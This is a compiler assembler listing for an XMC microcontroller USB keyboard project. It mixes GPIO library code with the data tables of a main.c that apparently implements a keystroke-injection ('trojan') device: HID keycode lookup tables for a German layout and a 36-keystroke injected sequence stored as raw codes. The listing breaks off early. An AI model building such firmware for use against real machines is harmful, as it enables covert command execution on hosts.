+ 205:/opt/XMClib/XMC_Peripheral_Library_v2.1.16/XMCLib/inc/xmc_gpio.h **** void XMC_GPIO_SetMode(XMC_GPIO_PORT_t *const port, const uint8_t pin, const XMC_GPIO_MODE_t mode);
+ 206:/opt/XMClib/XMC_Peripheral_Library_v2.1.16/XMCLib/inc/xmc_gpio.h **** 
+ 207:/opt/XMClib/XMC_Peripheral_Library_v2.1.16/XMCLib/inc/xmc_gpio.h **** 
+ 208:/opt/XMClib/XMC_Peripheral_Library_v2.1.16/XMCLib/inc/xmc_gpio.h **** /**
+ 209:/opt/XMClib/XMC_Peripheral_Library_v2.1.16/XMCLib/inc/xmc_gpio.h ****  *
+ 210:/opt/XMClib/XMC_Peripheral_Library_v2.1.16/XMCLib/inc/xmc_gpio.h ****  * @param  port	 Constant pointer pointing to GPIO port, to access hardware register Pn_OMR.
+ 211:/opt/XMClib/XMC_Peripheral_Library_v2.1.16/XMCLib/inc/xmc_gpio.h ****  * @param  pin	 Port pin number.
+ 212:/opt/XMClib/XMC_Peripheral_Library_v2.1.16/XMCLib/inc/xmc_gpio.h ****  * @param  level output level selection. Refer @ref XMC_GPIO_OUTPUT_LEVEL_t for valid values.
+ 213:/opt/XMClib/XMC_Peripheral_Library_v2.1.16/XMCLib/inc/xmc_gpio.h ****  *
+ 214:/opt/XMClib/XMC_Peripheral_Library_v2.1.16/XMCLib/inc/xmc_gpio.h ****  * @return None
+ 215:/opt/XMClib/XMC_Peripheral_Library_v2.1.16/XMCLib/inc/xmc_gpio.h ****  *
+ 216:/opt/XMClib/XMC_Peripheral_Library_v2.1.16/XMCLib/inc/xmc_gpio.h ****  * \par<b>Description:</b><br>
+ 217:/opt/XMClib/XMC_Peripheral_Library_v2.1.16/XMCLib/inc/xmc_gpio.h ****  * Set port pin output level to high or low.It configures hardware registers Pn_OMR.\a level is ini
+ 218:/opt/XMClib/XMC_Peripheral_Library_v2.1.16/XMCLib/inc/xmc_gpio.h ****  * configured during initialization in XMC_GPIO_Init(). Call this API to alter output level as need
+ 219:/opt/XMClib/XMC_Peripheral_Library_v2.1.16/XMCLib/inc/xmc_gpio.h ****  *
+ 220:/opt/XMClib/XMC_Peripheral_Library_v2.1.16/XMCLib/inc/xmc_gpio.h ****  * \par<b>Related APIs:</b><BR>
+ 221:/opt/XMClib/XMC_Peripheral_Library_v2.1.16/XMCLib/inc/xmc_gpio.h ****  *  XMC_GPIO_SetOutputHigh(), XMC_GPIO_SetOutputLow().
+ 222:/opt/XMClib/XMC_Peripheral_Library_v2.1.16/XMCLib/inc/xmc_gpio.h ****  *
+ 223:/opt/XMClib/XMC_Peripheral_Library_v2.1.16/XMCLib/inc/xmc_gpio.h ****  * \par<b>Note:</b><br>
+ 224:/opt/XMClib/XMC_Peripheral_Library_v2.1.16/XMCLib/inc/xmc_gpio.h ****  * Prior to this api, user has to configure port pin to output mode using XMC_GPIO_SetMode().
+ 225:/opt/XMClib/XMC_Peripheral_Library_v2.1.16/XMCLib/inc/xmc_gpio.h ****  *
+ 226:/opt/XMClib/XMC_Peripheral_Library_v2.1.16/XMCLib/inc/xmc_gpio.h ****  */
+ 227:/opt/XMClib/XMC_Peripheral_Library_v2.1.16/XMCLib/inc/xmc_gpio.h **** 
+ 228:/opt/XMClib/XMC_Peripheral_Library_v2.1.16/XMCLib/inc/xmc_gpio.h **** 
+ 229:/opt/XMClib/XMC_Peripheral_Library_v2.1.16/XMCLib/inc/xmc_gpio.h **** __STATIC_INLINE void XMC_GPIO_SetOutputLevel(XMC_GPIO_PORT_t *const port, const uint8_t pin, const 
+ 230:/opt/XMClib/XMC_Peripheral_Library_v2.1.16/XMCLib/inc/xmc_gpio.h **** {
+ 231:/opt/XMClib/XMC_Peripheral_Library_v2.1.16/XMCLib/inc/xmc_gpio.h ****   XMC_ASSERT("XMC_GPIO_SetOutputLevel: Invalid port", XMC_GPIO_CHECK_OUTPUT_PORT(port));
+ 232:/opt/XMClib/XMC_Peripheral_Library_v2.1.16/XMCLib/inc/xmc_gpio.h ****   XMC_ASSERT("XMC_GPIO_SetOutputLevel: Invalid output level", XMC_GPIO_CHECK_OUTPUT_LEVEL(level));
+ 233:/opt/XMClib/XMC_Peripheral_Library_v2.1.16/XMCLib/inc/xmc_gpio.h ****   
+ 234:/opt/XMClib/XMC_Peripheral_Library_v2.1.16/XMCLib/inc/xmc_gpio.h ****   port->OMR = (uint32_t)level << pin;
+ 235:/opt/XMClib/XMC_Peripheral_Library_v2.1.16/XMCLib/inc/xmc_gpio.h **** }
+ 236:/opt/XMClib/XMC_Peripheral_Library_v2.1.16/XMCLib/inc/xmc_gpio.h **** 
+ 237:/opt/XMClib/XMC_Peripheral_Library_v2.1.16/XMCLib/inc/xmc_gpio.h **** 
+ 238:/opt/XMClib/XMC_Peripheral_Library_v2.1.16/XMCLib/inc/xmc_gpio.h **** /**
+ 239:/opt/XMClib/XMC_Peripheral_Library_v2.1.16/XMCLib/inc/xmc_gpio.h ****  * @param  port constant pointer pointing to GPIO port, to access hardware register Pn_OMR.
+ 240:/opt/XMClib/XMC_Peripheral_Library_v2.1.16/XMCLib/inc/xmc_gpio.h ****  * @param  pin	Port pin number.
+ 241:/opt/XMClib/XMC_Peripheral_Library_v2.1.16/XMCLib/inc/xmc_gpio.h ****  *
+ 242:/opt/XMClib/XMC_Peripheral_Library_v2.1.16/XMCLib/inc/xmc_gpio.h ****  * @return None
+ 243:/opt/XMClib/XMC_Peripheral_Library_v2.1.16/XMCLib/inc/xmc_gpio.h ****  *
+ 244:/opt/XMClib/XMC_Peripheral_Library_v2.1.16/XMCLib/inc/xmc_gpio.h ****  * \par<b>Description:</b><br>
+ 245:/opt/XMClib/XMC_Peripheral_Library_v2.1.16/XMCLib/inc/xmc_gpio.h ****  *  Sets port pin output to high. It configures hardware registers Pn_OMR.
+ 246:/opt/XMClib/XMC_Peripheral_Library_v2.1.16/XMCLib/inc/xmc_gpio.h ****  *
+ 247:/opt/XMClib/XMC_Peripheral_Library_v2.1.16/XMCLib/inc/xmc_gpio.h ****  *  \par<b>Related APIs:</b><BR>
+ 248:/opt/XMClib/XMC_Peripheral_Library_v2.1.16/XMCLib/inc/xmc_gpio.h ****  *  XMC_GPIO_SetOutputLow()
+ 249:/opt/XMClib/XMC_Peripheral_Library_v2.1.16/XMCLib/inc/xmc_gpio.h ****  *
+ 250:/opt/XMClib/XMC_Peripheral_Library_v2.1.16/XMCLib/inc/xmc_gpio.h ****  * \par<b>Note:</b><br>
+ 251:/opt/XMClib/XMC_Peripheral_Library_v2.1.16/XMCLib/inc/xmc_gpio.h ****  * Prior to this api, user has to configure port pin to output mode using XMC_GPIO_SetMode().\n
+ 252:/opt/XMClib/XMC_Peripheral_Library_v2.1.16/XMCLib/inc/xmc_gpio.h ****  * Register Pn_OMR is virtual and does not contain any flip-flop. A read action delivers the value 
+ 253:/opt/XMClib/XMC_Peripheral_Library_v2.1.16/XMCLib/inc/xmc_gpio.h ****  *
+ 254:/opt/XMClib/XMC_Peripheral_Library_v2.1.16/XMCLib/inc/xmc_gpio.h ****  */
+ 255:/opt/XMClib/XMC_Peripheral_Library_v2.1.16/XMCLib/inc/xmc_gpio.h **** 
+ 256:/opt/XMClib/XMC_Peripheral_Library_v2.1.16/XMCLib/inc/xmc_gpio.h **** __STATIC_INLINE void XMC_GPIO_SetOutputHigh(XMC_GPIO_PORT_t *const port, const uint8_t pin)
+ 257:/opt/XMClib/XMC_Peripheral_Library_v2.1.16/XMCLib/inc/xmc_gpio.h **** {
+  27              		.loc 1 257 1
+  28              		.cfi_startproc
+  29              		@ args = 0, pretend = 0, frame = 8
+  30              		@ frame_needed = 1, uses_anonymous_args = 0
+  31              		@ link register save eliminated.
+  32 0000 80B4     		push	{r7}
+  33              	.LCFI0:
+  34              		.cfi_def_cfa_offset 4
+  35              		.cfi_offset 7, -4
+  36 0002 83B0     		sub	sp, sp, #12
+  37              	.LCFI1:
+  38              		.cfi_def_cfa_offset 16
+  39 0004 00AF     		add	r7, sp, #0
+  40              	.LCFI2:
+  41              		.cfi_def_cfa_register 7
+  42 0006 7860     		str	r0, [r7, #4]
+  43 0008 0B46     		mov	r3, r1
+  44 000a FB70     		strb	r3, [r7, #3]
+ 258:/opt/XMClib/XMC_Peripheral_Library_v2.1.16/XMCLib/inc/xmc_gpio.h ****   XMC_ASSERT("XMC_GPIO_SetOutputHigh: Invalid port", XMC_GPIO_CHECK_OUTPUT_PORT(port));
+ 259:/opt/XMClib/XMC_Peripheral_Library_v2.1.16/XMCLib/inc/xmc_gpio.h **** 
+ 260:/opt/XMClib/XMC_Peripheral_Library_v2.1.16/XMCLib/inc/xmc_gpio.h ****   port->OMR = (uint32_t)0x1U << pin;
+  45              		.loc 1 260 30
+  46 000c FB78     		ldrb	r3, [r7, #3]	@ zero_extendqisi2
+  47 000e 0122     		movs	r2, #1
+  48 0010 9A40     		lsls	r2, r2, r3
+  49              		.loc 1 260 13
+  50 0012 7B68     		ldr	r3, [r7, #4]
+  51 0014 5A60     		str	r2, [r3, #4]
+ 261:/opt/XMClib/XMC_Peripheral_Library_v2.1.16/XMCLib/inc/xmc_gpio.h **** }
+  52              		.loc 1 261 1
+  53 0016 00BF     		nop
+  54 0018 0C37     		adds	r7, r7, #12
+  55              	.LCFI3:
+  56              		.cfi_def_cfa_offset 4
+  57 001a BD46     		mov	sp, r7
+  58              	.LCFI4:
+  59              		.cfi_def_cfa_register 13
+  60              		@ sp needed
+  61 001c 5DF8047B 		ldr	r7, [sp], #4
+  62              	.LCFI5:
+  63              		.cfi_restore 7
+  64              		.cfi_def_cfa_offset 0
+  65 0020 7047     		bx	lr
+  66              		.cfi_endproc
+  67              	.LFE130:
+  69              		.section	.text.XMC_GPIO_SetOutputLow,"ax",%progbits
+  70              		.align	1
+  71              		.syntax unified
+  72              		.thumb
+  73              		.thumb_func
+  75              	XMC_GPIO_SetOutputLow:
+  76              	.LFB131:
+ 262:/opt/XMClib/XMC_Peripheral_Library_v2.1.16/XMCLib/inc/xmc_gpio.h **** 
+ 263:/opt/XMClib/XMC_Peripheral_Library_v2.1.16/XMCLib/inc/xmc_gpio.h **** /**
+ 264:/opt/XMClib/XMC_Peripheral_Library_v2.1.16/XMCLib/inc/xmc_gpio.h ****  *
+ 265:/opt/XMClib/XMC_Peripheral_Library_v2.1.16/XMCLib/inc/xmc_gpio.h ****  * @param  port	constant pointer pointing to GPIO port, to access hardware register Pn_OMR.
+ 266:/opt/XMClib/XMC_Peripheral_Library_v2.1.16/XMCLib/inc/xmc_gpio.h ****  * @param  pin	port pin number.
+ 267:/opt/XMClib/XMC_Peripheral_Library_v2.1.16/XMCLib/inc/xmc_gpio.h ****  *
+ 268:/opt/XMClib/XMC_Peripheral_Library_v2.1.16/XMCLib/inc/xmc_gpio.h ****  * @return  None
+ 269:/opt/XMClib/XMC_Peripheral_Library_v2.1.16/XMCLib/inc/xmc_gpio.h ****  *
+ 270:/opt/XMClib/XMC_Peripheral_Library_v2.1.16/XMCLib/inc/xmc_gpio.h ****  *\par<b>Description:</b><br>
+ 271:/opt/XMClib/XMC_Peripheral_Library_v2.1.16/XMCLib/inc/xmc_gpio.h ****  * Sets port pin output to low. It configures hardware registers Pn_OMR.\n
+ 272:/opt/XMClib/XMC_Peripheral_Library_v2.1.16/XMCLib/inc/xmc_gpio.h ****  *
+ 273:/opt/XMClib/XMC_Peripheral_Library_v2.1.16/XMCLib/inc/xmc_gpio.h ****  * \par<b>Related APIs:</b><BR>>
+ 274:/opt/XMClib/XMC_Peripheral_Library_v2.1.16/XMCLib/inc/xmc_gpio.h ****  * XMC_GPIO_SetOutputHigh()
+ 275:/opt/XMClib/XMC_Peripheral_Library_v2.1.16/XMCLib/inc/xmc_gpio.h ****  *
+ 276:/opt/XMClib/XMC_Peripheral_Library_v2.1.16/XMCLib/inc/xmc_gpio.h ****  *\par<b>Note:</b><br>
+ 277:/opt/XMClib/XMC_Peripheral_Library_v2.1.16/XMCLib/inc/xmc_gpio.h ****  * Prior to this api, user has to configure port pin to output mode using XMC_GPIO_SetMode().
+ 278:/opt/XMClib/XMC_Peripheral_Library_v2.1.16/XMCLib/inc/xmc_gpio.h ****  * Register Pn_OMR is virtual and does not contain any flip-flop. A read action delivers the value 
+ 279:/opt/XMClib/XMC_Peripheral_Library_v2.1.16/XMCLib/inc/xmc_gpio.h ****  *
+ 280:/opt/XMClib/XMC_Peripheral_Library_v2.1.16/XMCLib/inc/xmc_gpio.h ****  */
+ 281:/opt/XMClib/XMC_Peripheral_Library_v2.1.16/XMCLib/inc/xmc_gpio.h **** 
+ 282:/opt/XMClib/XMC_Peripheral_Library_v2.1.16/XMCLib/inc/xmc_gpio.h **** __STATIC_INLINE void XMC_GPIO_SetOutputLow(XMC_GPIO_PORT_t *const port, const uint8_t pin)
+ 283:/opt/XMClib/XMC_Peripheral_Library_v2.1.16/XMCLib/inc/xmc_gpio.h **** {
+  77              		.loc 1 283 1
+  78              		.cfi_startproc
+  79              		@ args = 0, pretend = 0, frame = 8
+  80              		@ frame_needed = 1, uses_anonymous_args = 0
+  81              		@ link register save eliminated.
+  82 0000 80B4     		push	{r7}
+  83              	.LCFI6:
+  84              		.cfi_def_cfa_offset 4
+  85              		.cfi_offset 7, -4
+  86 0002 83B0     		sub	sp, sp, #12
+  87              	.LCFI7:
+  88              		.cfi_def_cfa_offset 16
+  89 0004 00AF     		add	r7, sp, #0
+  90              	.LCFI8:
+  91              		.cfi_def_cfa_register 7
+  92 0006 7860     		str	r0, [r7, #4]
+  93 0008 0B46     		mov	r3, r1
+  94 000a FB70     		strb	r3, [r7, #3]
+ 284:/opt/XMClib/XMC_Peripheral_Library_v2.1.16/XMCLib/inc/xmc_gpio.h ****   XMC_ASSERT("XMC_GPIO_SetOutputLow: Invalid port", XMC_GPIO_CHECK_OUTPUT_PORT(port));
+ 285:/opt/XMClib/XMC_Peripheral_Library_v2.1.16/XMCLib/inc/xmc_gpio.h **** 
+ 286:/opt/XMClib/XMC_Peripheral_Library_v2.1.16/XMCLib/inc/xmc_gpio.h ****   port->OMR = 0x10000U << pin;
+  95              		.loc 1 286 24
+  96 000c FB78     		ldrb	r3, [r7, #3]	@ zero_extendqisi2
+  97 000e 4FF48032 		mov	r2, #65536
+  98 0012 9A40     		lsls	r2, r2, r3
+  99              		.loc 1 286 13
+ 100 0014 7B68     		ldr	r3, [r7, #4]
+ 101 0016 5A60     		str	r2, [r3, #4]
+ 287:/opt/XMClib/XMC_Peripheral_Library_v2.1.16/XMCLib/inc/xmc_gpio.h **** }
+ 102              		.loc 1 287 1
+ 103 0018 00BF     		nop
+ 104 001a 0C37     		adds	r7, r7, #12
+ 105              	.LCFI9:
+ 106              		.cfi_def_cfa_offset 4
+ 107 001c BD46     		mov	sp, r7
+ 108              	.LCFI10:
+ 109              		.cfi_def_cfa_register 13
+ 110              		@ sp needed
+ 111 001e 5DF8047B 		ldr	r7, [sp], #4
+ 112              	.LCFI11:
+ 113              		.cfi_restore 7
+ 114              		.cfi_def_cfa_offset 0
+ 115 0022 7047     		bx	lr
+ 116              		.cfi_endproc
+ 117              	.LFE131:
+ 119              		.global	i
+ 120              		.bss
+ 121              		.align	2
+ 124              	i:
+ 125 0000 00000000 		.space	4
+ 126              		.global	maxtime
+ 127              		.align	2
+ 130              	maxtime:
+ 131 0004 00000000 		.space	4
+ 132              		.global	solutionlen
+ 133              		.align	2
+ 136              	solutionlen:
+ 137 0008 00000000 		.space	4
+ 138              		.global	password_enable
+ 139              		.data
+ 140              		.align	2
+ 143              	password_enable:
+ 144 0000 01000000 		.word	1
+ 145              		.global	string_index
+ 146              		.bss
+ 147              		.align	2
+ 150              	string_index:
+ 151 000c 00000000 		.space	4
+ 152              		.global	stringlenght
+ 153              		.data
+ 154              		.align	2
+ 157              	stringlenght:
+ 158 0004 02000000 		.word	2
+ 159              		.global	global_string_len
+ 162              	global_string_len:
+ 163 0008 5A       		.byte	90
+ 164              		.global	global_index
+ 165              		.bss
+ 168              	global_index:
+ 169 0010 00       		.space	1
+ 170              		.global	led_toggle_distance
+ 171 0011 000000   		.align	2
+ 174              	led_toggle_distance:
+ 175 0014 00000000 		.space	4
+ 176              		.align	2
+ 177              	last_led_tick:
+ 178 0018 00000000 		.space	4
+ 180              		.global	public_distance
+ 181              		.align	2
+ 184              	public_distance:
+ 185 001c 00000000 		.space	4
+ 186              	characterSent:
+ 187 0020 00       		.space	1
+ 189              	indexToSend:
+ 190 0021 00       		.space	1
+ 192              		.global	msgiterator
+ 193 0022 0000     		.align	2
+ 196              	msgiterator:
+ 197 0024 00000000 		.space	4
+ 198              		.global	solution_paste_index
+ 199              		.align	2
+ 202              	solution_paste_index:
+ 203 0028 00000000 		.space	4
+ 204              		.global	msTicks
+ 205              		.align	2
+ 208              	msTicks:
+ 209 002c 00000000 		.space	4
+ 210              		.global	current_str_lenght
+ 211              		.data
+ 212 0009 000000   		.align	2
+ 215              	current_str_lenght:
+ 216 000c 02000000 		.word	2
+ 217              		.global	string2sendlen
+ 218              		.align	2
+ 221              	string2sendlen:
+ 222 0010 02000000 		.word	2
+ 223              		.global	current_string_length
+ 224              		.align	2
+ 227              	current_string_length:
+ 228 0014 01000000 		.word	1
+ 229              		.global	startTime
+ 230              		.bss
+ 231              		.align	2
+ 234              	startTime:
+ 235 0030 00000000 		.space	4
+ 236              		.global	trojanLen
+ 237              		.data
+ 238              		.align	2
+ 241              	trojanLen:
+ 242 0018 24000000 		.word	36
+ 243              		.global	keyLut
+ 244              		.align	2
+ 247              	keyLut:
+ 248 001c 04       		.byte	4
+ 249 001d 00       		.byte	0
+ 250 001e 05       		.byte	5
+ 251 001f 00       		.byte	0
+ 252 0020 06       		.byte	6
+ 253 0021 00       		.byte	0
+ 254 0022 07       		.byte	7
+ 255 0023 00       		.byte	0
+ 256 0024 08       		.byte	8
+ 257 0025 00       		.byte	0
+ 258 0026 09       		.byte	9
+ 259 0027 00       		.byte	0
+ 260 0028 0A       		.byte	10
+ 261 0029 00       		.byte	0
+ 262 002a 0B       		.byte	11
+ 263 002b 00       		.byte	0
+ 264 002c 0C       		.byte	12
+ 265 002d 00       		.byte	0
+ 266 002e 0D       		.byte	13
+ 267 002f 00       		.byte	0
+ 268 0030 0E       		.byte	14
+ 269 0031 00       		.byte	0
+ 270 0032 0F       		.byte	15
+ 271 0033 00       		.byte	0
+ 272 0034 10       		.byte	16
+ 273 0035 00       		.byte	0
+ 274 0036 11       		.byte	17
+ 275 0037 00       		.byte	0
+ 276 0038 12       		.byte	18
+ 277 0039 00       		.byte	0
+ 278 003a 13       		.byte	19
+ 279 003b 00       		.byte	0
+ 280 003c 14       		.byte	20
+ 281 003d 00       		.byte	0
+ 282 003e 15       		.byte	21
+ 283 003f 00       		.byte	0
+ 284 0040 16       		.byte	22
+ 285 0041 00       		.byte	0
+ 286 0042 17       		.byte	23
+ 287 0043 00       		.byte	0
+ 288 0044 18       		.byte	24
+ 289 0045 00       		.byte	0
+ 290 0046 19       		.byte	25
+ 291 0047 00       		.byte	0
+ 292 0048 1A       		.byte	26
+ 293 0049 00       		.byte	0
+ 294 004a 1B       		.byte	27
+ 295 004b 00       		.byte	0
+ 296 004c 1D       		.byte	29
+ 297 004d 00       		.byte	0
+ 298 004e 1C       		.byte	28
+ 299 004f 00       		.byte	0
+ 300 0050 1E       		.byte	30
+ 301 0051 00       		.byte	0
+ 302 0052 1F       		.byte	31
+ 303 0053 00       		.byte	0
+ 304 0054 20       		.byte	32
+ 305 0055 00       		.byte	0
+ 306 0056 21       		.byte	33
+ 307 0057 00       		.byte	0
+ 308 0058 22       		.byte	34
+ 309 0059 00       		.byte	0
+ 310 005a 23       		.byte	35
+ 311 005b 00       		.byte	0
+ 312 005c 24       		.byte	36
+ 313 005d 00       		.byte	0
+ 314 005e 25       		.byte	37
+ 315 005f 00       		.byte	0
+ 316 0060 26       		.byte	38
+ 317 0061 00       		.byte	0
+ 318 0062 27       		.byte	39
+ 319 0063 00       		.byte	0
+ 320 0064 38       		.byte	56
+ 321 0065 00       		.byte	0
+ 322 0066 30       		.byte	48
+ 323 0067 00       		.byte	0
+ 324 0068 36       		.byte	54
+ 325 0069 00       		.byte	0
+ 326 006a 37       		.byte	55
+ 327 006b 00       		.byte	0
+ 328 006c 64       		.byte	100
+ 329 006d 00       		.byte	0
+ 330 006e 2D       		.byte	45
+ 331 006f 00       		.byte	0
+ 332 0070 04       		.byte	4
+ 333 0071 01       		.byte	1
+ 334 0072 05       		.byte	5
+ 335 0073 01       		.byte	1
+ 336 0074 06       		.byte	6
+ 337 0075 01       		.byte	1
+ 338 0076 07       		.byte	7
+ 339 0077 01       		.byte	1
+ 340 0078 08       		.byte	8
+ 341 0079 01       		.byte	1
+ 342 007a 09       		.byte	9
+ 343 007b 01       		.byte	1
+ 344 007c 0A       		.byte	10
+ 345 007d 01       		.byte	1
+ 346 007e 0B       		.byte	11
+ 347 007f 01       		.byte	1
+ 348 0080 0C       		.byte	12
+ 349 0081 01       		.byte	1
+ 350 0082 0D       		.byte	13
+ 351 0083 01       		.byte	1
+ 352 0084 0E       		.byte	14
+ 353 0085 01       		.byte	1
+ 354 0086 0F       		.byte	15
+ 355 0087 01       		.byte	1
+ 356 0088 10       		.byte	16
+ 357 0089 01       		.byte	1
+ 358 008a 11       		.byte	17
+ 359 008b 01       		.byte	1
+ 360 008c 12       		.byte	18
+ 361 008d 01       		.byte	1
+ 362 008e 13       		.byte	19
+ 363 008f 01       		.byte	1
+ 364 0090 14       		.byte	20
+ 365 0091 01       		.byte	1
+ 366 0092 15       		.byte	21
+ 367 0093 01       		.byte	1
+ 368 0094 16       		.byte	22
+ 369 0095 01       		.byte	1
+ 370 0096 17       		.byte	23
+ 371 0097 01       		.byte	1
+ 372 0098 18       		.byte	24
+ 373 0099 01       		.byte	1
+ 374 009a 19       		.byte	25
+ 375 009b 01       		.byte	1
+ 376 009c 1A       		.byte	26
+ 377 009d 01       		.byte	1
+ 378 009e 1B       		.byte	27
+ 379 009f 01       		.byte	1
+ 380 00a0 1D       		.byte	29
+ 381 00a1 01       		.byte	1
+ 382 00a2 1C       		.byte	28
+ 383 00a3 01       		.byte	1
+ 384 00a4 1E       		.byte	30
+ 385 00a5 01       		.byte	1
+ 386 00a6 1F       		.byte	31
+ 387 00a7 01       		.byte	1
+ 388 00a8 20       		.byte	32
+ 389 00a9 01       		.byte	1
+ 390 00aa 21       		.byte	33
+ 391 00ab 01       		.byte	1
+ 392 00ac 22       		.byte	34
+ 393 00ad 01       		.byte	1
+ 394 00ae 23       		.byte	35
+ 395 00af 01       		.byte	1
+ 396 00b0 24       		.byte	36
+ 397 00b1 01       		.byte	1
+ 398 00b2 25       		.byte	37
+ 399 00b3 01       		.byte	1
+ 400 00b4 26       		.byte	38
+ 401 00b5 01       		.byte	1
+ 402 00b6 27       		.byte	39
+ 403 00b7 01       		.byte	1
+ 404 00b8 38       		.byte	56
+ 405 00b9 01       		.byte	1
+ 406 00ba 30       		.byte	48
+ 407 00bb 01       		.byte	1
+ 408 00bc 36       		.byte	54
+ 409 00bd 01       		.byte	1
+ 410 00be 37       		.byte	55
+ 411 00bf 01       		.byte	1
+ 412 00c0 2D       		.byte	45
+ 413 00c1 01       		.byte	1
+ 414 00c2 64       		.byte	100
+ 415 00c3 01       		.byte	1
+ 416 00c4 24       		.byte	36
+ 417 00c5 02       		.byte	2
+ 418 00c6 25       		.byte	37
+ 419 00c7 02       		.byte	2
+ 420 00c8 26       		.byte	38
+ 421 00c9 02       		.byte	2
+ 422 00ca 27       		.byte	39
+ 423 00cb 02       		.byte	2
+ 424 00cc 30       		.byte	48
+ 425 00cd 02       		.byte	2
+ 426 00ce 64       		.byte	100
+ 427 00cf 02       		.byte	2
+ 428 00d0 2D       		.byte	45
+ 429 00d1 02       		.byte	2
+ 430 00d2 00000000 		.space	8
+ 430      00000000 
+ 431              		.global	solutionLut
+ 432 00da 0000     		.align	2
+ 435              	solutionLut:
+ 436 00dc 19       		.byte	25
+ 437 00dd 00       		.byte	0
+ 438 00de 0A       		.byte	10
+ 439 00df 00       		.byte	0
+ 440 00e0 07       		.byte	7
+ 441 00e1 00       		.byte	0
+ 442 00e2 00000000 		.space	94
+ 442      00000000 
+ 442      00000000 
+ 442      00000000 
+ 442      00000000 
+ 443              		.global	string2sendLut
+ 444              		.align	2
+ 447              	string2sendLut:
+ 448 0140 04       		.byte	4
+ 449 0141 00       		.byte	0
+ 450 0142 28       		.byte	40
+ 451 0143 00       		.byte	0
+ 452 0144 00000000 		.space	96
+ 452      00000000 
+ 452      00000000 
+ 452      00000000 
+ 452      00000000 
+ 453              		.global	trojanInstuctionsLut
+ 454              		.align	2
+ 457              	trojanInstuctionsLut:
+ 458 01a4 39       		.byte	57
+ 459 01a5 00       		.byte	0
+ 460 01a6 08       		.byte	8
+ 461 01a7 00       		.byte	0
+ 462 01a8 06       		.byte	6
+ 463 01a9 00       		.byte	0
+ 464 01aa 0B       		.byte	11
+ 465 01ab 00       		.byte	0
+ 466 01ac 12       		.byte	18
+ 467 01ad 00       		.byte	0
+ 468 01ae 2C       		.byte	44
+ 469 01af 00       		.byte	0
+ 470 01b0 1F       		.byte	31
+ 471 01b1 01       		.byte	1
+ 472 01b2 10       		.byte	16
+ 473 01b3 01       		.byte	1
+ 474 01b4 0C       		.byte	12
+ 475 01b5 00       		.byte	0
+ 476 01b6 0F       		.byte	15
+ 477 01b7 00       		.byte	0
+ 478 01b8 12       		.byte	18
+ 479 01b9 00       		.byte	0
+ 480 01ba 2C       		.byte	44
+ 481 01bb 00       		.byte	0
+ 482 01bc 19       		.byte	25
+ 483 01bd 01       		.byte	1
+ 484 01be 04       		.byte	4
+ 485 01bf 00       		.byte	0
+ 486 01c0 0F       		.byte	15
+ 487 01c1 00       		.byte	0
+ 488 01c2 0F       		.byte	15
+ 489 01c3 00       		.byte	0
+ 490 01c4 08       		.byte	8
+ 491 01c5 00       		.byte	0
+ 492 01c6 1F       		.byte	31
+ 493 01c7 01       		.byte	1
+ 494 01c8 2C       		.byte	44
+ 495 01c9 00       		.byte	0
+ 496 01ca 64       		.byte	100
+ 497 01cb 01       		.byte	1
+ 498 01cc 2C       		.byte	44
+ 499 01cd 00       		.byte	0
+ 500 01ce 21       		.byte	33
+ 501 01cf 01       		.byte	1
+ 502 01d0 0B       		.byte	11
+ 503 01d1 01       		.byte	1
+ 504 01d2 12       		.byte	18
+ 505 01d3 01       		.byte	1
+ 506 01d4 10       		.byte	16
+ 507 01d5 01       		.byte	1
+ 508 01d6 08       		.byte	8
+ 509 01d7 01       		.byte	1
+ 510 01d8 24       		.byte	36
+ 511 01d9 01       		.byte	1
+ 512 01da 27       		.byte	39
+ 513 01db 00       		.byte	0
+ 514 01dc 20       		.byte	32
+ 515 01dd 00       		.byte	0
+ 516 01de 25       		.byte	37
+ 517 01df 00       		.byte	0
+ 518 01e0 1E       		.byte	30
+ 519 01e1 00       		.byte	0
+ 520 01e2 20       		.byte	32
+ 521 01e3 00       		.byte	0
+ 522 01e4 1F       		.byte	31
+ 523 01e5 00       		.byte	0
+ 524 01e6 22       		.byte	34
+ 525 01e7 00       		.byte	0
+ 526 01e8 20       		.byte	32
+ 527 01e9 00       		.byte	0
+ 528 01ea 28       		.byte	40
+ 529 01eb 00       		.byte	0
+ 530              		.section	.text.insertKeydata,"ax",%progbits
+ 531              		.align	1
+ 532              		.global	insertKeydata
+ 533              		.syntax unified
+ 534              		.thumb
+ 535              		.thumb_func
+ 537              	insertKeydata:
+ 538              	.LFB203:
+ 539              		.file 2 "main.c"
+   1:main.c        **** 
+   2:main.c        **** #include "KeyboardHID.h"
+   3:main.c        **** #include "german_keyboardCodes.h"
+   4:main.c        **** 
+   5:main.c        **** /* Macros: */
+   6:main.c        **** #define LED1 P1_1
+   7:main.c        **** #define LED2 P1_0
+   8:main.c        **** #define AltGr_index 84
+   9:main.c        **** #define Shift_index 43
+  10:main.c        **** #define msg_len 92
+  11:main.c        **** 
+  12:main.c        **** volatile int i = 0;
+  13:main.c        **** int maxtime = 0;
+  14:main.c        **** int solutionlen = 0;
+  15:main.c        **** 
+  16:main.c        **** int password_enable = 1;
+  17:main.c        ****  int string_index = 0;
+  18:main.c        **** int stringlenght = 2;
+  19:main.c        **** 
+  20:main.c        **** uint8_t  global_string_len = 90;
+  21:main.c        **** volatile uint8_t global_index = 0; // Reset this to 0 to start typing
+  22:main.c        **** volatile uint32_t led_toggle_distance = 0; // The public distance value
+  23:main.c        **** static uint32_t last_led_tick = 0;         // Helper to remember the previous time
+  24:main.c        **** volatile uint32_t public_distance = 0; // Accessible everywhere
+  25:main.c        **** 
+  26:main.c        **** static uint8_t characterSent = 0, indexToSend = 0;
+  27:main.c        **** int msgiterator = 0;
+  28:main.c        **** 	
+  29:main.c        **** int solution_paste_index = 0;
+  30:main.c        **** 
+  31:main.c        **** volatile uint32_t msTicks = 0;
+  32:main.c        **** 
+  33:main.c        **** 
+  34:main.c        **** 
+  35:main.c        **** int current_str_lenght = 2;
+  36:main.c        **** int string2sendlen = 2;
+  37:main.c        **** 
+  38:main.c        **** int current_string_length = 1;
+  39:main.c        **** int startTime = 0;
+  40:main.c        **** int trojanLen = 36;  // 36 Keydata structs
+  41:main.c        **** typedef struct { // Generic struct structure
+  42:main.c        **** 
+  43:main.c        **** uint8_t Key;
+  44:main.c        **** uint8_t Mod;
+  45:main.c        **** 
+  46:main.c        **** 
+  47:main.c        **** 
+  48:main.c        **** 
+  49:main.c        **** } Keydata;
+  50:main.c        **** 
+  51:main.c        **** 
+  52:main.c        **** Keydata keyLut [95]= {
+  53:main.c        ****     // Normal keys (mod = 0)
